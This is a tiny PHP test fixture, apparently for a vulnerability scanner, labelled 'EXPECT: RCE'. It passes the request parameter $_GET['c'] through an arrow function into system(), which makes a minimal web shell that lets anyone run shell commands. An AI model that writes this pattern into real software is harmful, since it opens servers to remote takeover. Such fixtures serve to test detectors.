<?php
// EXPECT: RCE
$f = fn($v) => system($v);
$f($_GET['c']);
